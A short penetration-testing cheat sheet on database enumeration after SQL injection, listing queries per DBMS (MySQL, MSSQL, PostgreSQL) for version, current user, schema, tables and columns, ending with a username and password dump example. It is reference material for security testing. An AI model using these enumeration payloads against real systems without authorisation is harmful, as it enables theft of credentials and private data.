---
title: Database Enumeration
description: Enumeration Database information and dump tables
categories: [Web Attack, SQL Injection, Database]
tags: [Web Attack, SQL Injection]
weight: 2
---

Database Enumeration and dumping is a crucial component of SQL Injection testing after the vulnerability has been confirmed. We can extract various sensitive data, user credentials, and much more.

## Database Identification
The first step is to identify the type and version of **Database Management Systems (DBMS)** we are interacting with:

**MySQL**:
```sql
SELECT @@version;
```

**MSSQL**:
```sql
SELECT @@version;
```

**PostgreSQL**:
```sql
SELECT version()
```

## Database User
It may also be beneficial to enumerate the user that the web application is authenticating to the database as.

**MySQL**:
```sql
SELECT USER();
SELECT CURRENT_USER();
SELECT CURRENT_USER;
SELECT SESSION_USER();
```

**MSSQL**:
```sql
SELECT CURRENT_USER;
SELECT user_name();
SELECT system_user;
SELECT user;
```

**PostgreSQL**:
```sql
SELECT user;
SELECT current_user;
SELECT session_user;
SELECT usename FROM pg_user;
SELECT getpgusername();
```

## Database Schema
Database schema refers to the structure of the database, including the databases, tables, and columns. We can use SQL injection to dump those information to find interesting information for the purposes of our engagement.

**MSSQL**:
| Information           | Payload                                                                                                 |
|-----------------------|---------------------------------------------------------------------------------------------------------|
| Database names        | `SELECT name FROM master..sysdatabases;` OR `SELECT name FROM master.sys.databases;`                    |                                                  |
| Table names           | `SELECT name FROM DB_NAME..sysobjects WHERE xtype = 'U';`                                               |
| Column names          | `SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name='sometable'; `  |

**MySQL**:
| Information           | Payload                                                                                                 |
|-----------------------|---------------------------------------------------------------------------------------------------------|
| Database names        | `SELECT schema_name FROM information_schema .schemata`                                                  |
| Table names           | `SELECT table_name FROM information_schema.tables WHERE table_schema=DB_NAME`                           |
| Column names          | `SELECT column_name FROM information_schema.columns WHERE table_schema=DB_NAME AND table_name=TB_NAME`  |

**PostgreSQL**:
| Information           | Payload                                                                                                 |
|-----------------------|---------------------------------------------------------------------------------------------------------|
| Database names        | `SELECT datname FROM pg_database`                                                                       |
| Table names           | `SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>'`                   |
| Column names          | `SELECT column_name FROM information_schema.columns WHERE table_name='data_table'`                      |

## Dumping data
After finding what databases, tables and columns are stored on the database, we can dump them using SELECT statements.

Example:
```sql
SELECT username, password FROM users;
```

## References
- [SQL Injection section in PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
